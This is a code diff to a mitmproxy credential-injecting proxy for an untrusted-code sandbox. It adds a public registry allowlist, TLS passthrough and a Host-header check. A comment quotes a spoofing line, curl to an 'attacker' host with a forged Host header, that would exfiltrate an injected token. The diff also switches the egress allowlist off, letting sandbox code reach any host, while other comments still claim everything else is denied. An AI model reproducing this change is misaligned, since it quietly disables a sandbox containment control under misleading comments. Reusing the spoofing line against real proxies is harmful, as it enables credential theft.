@@ -24,9 +24,13 @@ from mitmproxy import ctx, http
 # USER CONFIG: edit this section to customize hosts, token sources, and injection
 # =============================================================================
 
-# Closed-by-default egress posture. Requests to hosts not listed in HOST_RULES are
-# denied with HTTP 403. Set to False only if your sandbox network policy allows it.
-ENFORCE_EGRESS_ALLOWLIST = True
+# Egress posture. When True, requests to hosts not in HOST_RULES are denied (403).
+# When False (default here), the sandbox may reach ANY host: credential hosts
+# (see HOST_RULES) are intercepted and auto-authenticated, and every other host
+# is passed through untouched (see the tls_clienthello passthrough below), so
+# arbitrary package installs (apk/apt/pip/npm/cargo/...) work in any image using
+# the real upstream TLS certificate, with no proxy CA trust required.
+ENFORCE_EGRESS_ALLOWLIST = False
 
 # Token lookup table. Values are loaded from environment variables by default so
 # secrets can be supplied with `docker run -e ...`, Compose/Kubernetes secrets, or
@@ -117,6 +121,49 @@ HOST_RULES: dict[str, dict[str, Any]] = {
     #     "header_name": "PRIVATE-TOKEN",
     # },
 }
+
+# Public package-registry hosts the sandbox may reach WITHOUT any credential
+# injection. These keep the closed-by-default egress posture (everything else is
+# still denied) while letting the standard toolchains fetch PUBLIC dependencies:
+#   pip, npm/yarn/pnpm, go modules, cargo, maven/gradle, and dotnet/nuget.
+#
+# Deliberately excluded: broad multi-tenant object stores (e.g.
+# storage.googleapis.com, *.blob.core.windows.net, s3.amazonaws.com); allowing
+# those would open an exfiltration channel to attacker-controlled buckets. The
+# registries below are dedicated package hosts where publishing arbitrary content
+# is noisy/impractical. For a PRIVATE registry, add it to HOST_RULES with a token
+# instead of here.
+PUBLIC_EGRESS_HOSTS: tuple[str, ...] = (
+    # Python (pip / PyPI)
+    "pypi.org",
+    "files.pythonhosted.org",
+    # Node (npm / yarn / pnpm)
+    "registry.npmjs.org",
+    "registry.yarnpkg.com",
+    # Go modules (keep GOPROXY=proxy.golang.org so zips route through here)
+    "proxy.golang.org",
+    "sum.golang.org",
+    "index.golang.org",
+    # Rust (cargo, sparse index is the modern default)
+    "crates.io",
+    "index.crates.io",
+    "static.crates.io",
+    # Java (Maven Central + Gradle distributions/plugins)
+    "repo.maven.apache.org",
+    "repo1.maven.org",
+    "plugins.gradle.org",
+    "services.gradle.org",
+    "downloads.gradle.org",
+    # .NET (NuGet)
+    "api.nuget.org",
+    "www.nuget.org",
+)
+
+# Register the public hosts as allow-through rules (no token, no injection).
+# setdefault so an explicit HOST_RULES entry (e.g. a private mirror with a token)
+# always takes precedence over the public default.
+for _public_host in PUBLIC_EGRESS_HOSTS:
+    HOST_RULES.setdefault(_public_host, {"public": True})
 
 # Client-supplied credential headers are removed before injecting proxy-owned
 # credentials so untrusted sandbox code cannot smuggle its own Authorization value.
@@ -299,16 +346,69 @@ def _inject(flow: http.HTTPFlow, host_pattern: str, rule: dict[str, Any], token:
     ctx.log.info(f"matched host rule {host_pattern!r}; injected {scheme!r} credentials")
 
 
+def _is_credential_host(host: str) -> bool:
+    """True if host matches a HOST_RULES entry that injects a credential.
+
+    Public/allow-through rules and unmatched hosts are NOT credential hosts, so
+    they are TLS-passed-through (see tls_clienthello) rather than intercepted.
+    """
+    _pattern, rule = _find_rule(host)
+    return rule is not None and not rule.get("public")
+
+
+def tls_clienthello(data) -> None:
+    """Decide, per TLS connection, whether to intercept or pass through.
+
+    Only credential hosts (github/gitlab/etc. in HOST_RULES) are intercepted so
+    the proxy can inject the real token. Every other host is passed through as an
+    opaque TLS tunnel using the upstream's genuine certificate. This lets
+    untrusted sandbox code reach ANY host and run system/package installs in an
+    arbitrary image without needing to trust the proxy CA, while credentials are
+    still injected ONLY for the endpoints that require authentication.
+    """
+    sni = getattr(data.client_hello, "sni", None) or ""
+    if not _is_credential_host(sni):
+        # Not a host we authenticate: tunnel the raw TLS bytes end-to-end.
+        data.ignore_connection = True
+
+
 def request(flow: http.HTTPFlow) -> None:
     """mitmproxy request hook for HTTP and intercepted HTTPS requests."""
-    host = flow.request.pretty_host
-    host_pattern, rule = _find_rule(host)
+    # SECURITY: the egress allowlist AND credential-injection decision must be based
+    # on the ACTUAL upstream the proxy connects to (flow.request.host, taken from the
+    # request-line authority / CONNECT target / SNI), never on flow.request.pretty_host.
+    # pretty_host prefers the client-supplied Host header, which untrusted sandbox code
+    # can spoof (e.g. `curl http://attacker/ -H 'Host: github.com'`) to make the proxy
+    # inject the real token and then deliver it to an attacker-controlled server.
+    conn_host = flow.request.host
+    header_host = flow.request.host_header or ""
+    host_pattern, rule = _find_rule(conn_host)
 
     if rule is None:
         if ENFORCE_EGRESS_ALLOWLIST:
-            _deny(flow, host)
+            _deny(flow, conn_host)
         # To relax networking, set ENFORCE_EGRESS_ALLOWLIST = False. Unmatched
         # requests will then pass through without proxy-injected credentials.
+        return
+
+    # Public package-registry hosts: allowlisted for egress but NEVER get a proxy
+    # credential. The sandbox fetches public dependencies directly; no token is
+    # involved, so the Host/target defenses below (which protect injected creds)
+    # are unnecessary here.
+    if rule.get("public"):
+        ctx.log.info(f"allowed public egress: host={conn_host!r}")
+        return
+
+    # Defense in depth: for an allowlisted upstream, refuse when the Host header (or
+    # any host component the request would present downstream) disagrees with the real
+    # connection target. This blocks Host/SNI confusion so injected credentials can
+    # never be routed to a host other than the one that matched the rule.
+    if header_host and header_host.lower().rstrip(".") != conn_host.lower().rstrip("."):
+        ctx.log.warn(
+            f"egress denied: Host header {header_host!r} does not match connection "
+            f"target {conn_host!r} (possible credential-redirection attempt)"
+        )
+        _deny(flow, conn_host)
         return
 
     _strip_client_credentials(flow)
